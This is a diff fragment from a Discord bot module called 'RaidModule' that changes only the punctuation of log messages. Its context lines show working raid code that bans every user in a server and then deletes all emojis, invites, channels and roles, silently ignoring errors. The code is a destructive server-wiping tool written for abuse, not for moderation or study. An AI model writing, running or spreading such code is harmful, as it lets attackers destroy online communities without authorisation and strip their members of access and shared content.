@@ -24,25 +24,25 @@ class RaidModule(commands.Cog):
                             await ctx.guild.ban(user)
                         except Exception:
                             pass
-                    print(f"Banned all user.")
+                    print(f"Banned all user!")
                     for emoji in list(ctx.guild.emojis):
                         try:
                             await emoji.delete()
                         except Exception:
                             pass
-                    print(f"Deleted all emojis.")
+                    print(f"Deleted all emojis!")
                     for invite in await ctx.guild.invites():
                         try:
                             await invite.delete()
                         except Exception:
                             pass
-                    print(f"Deleted all invites.")
+                    print(f"Deleted all invites!")
                     for channels in list(ctx.guild.channels):
                         try:
                             await channels.delete()
                         except Exception:
                             pass
-                    print(f"Deleted all channels.")
+                    print(f"Deleted all channels!")
                     for roles in list(ctx.guild.roles):
                         try:
                             await roles.delete()
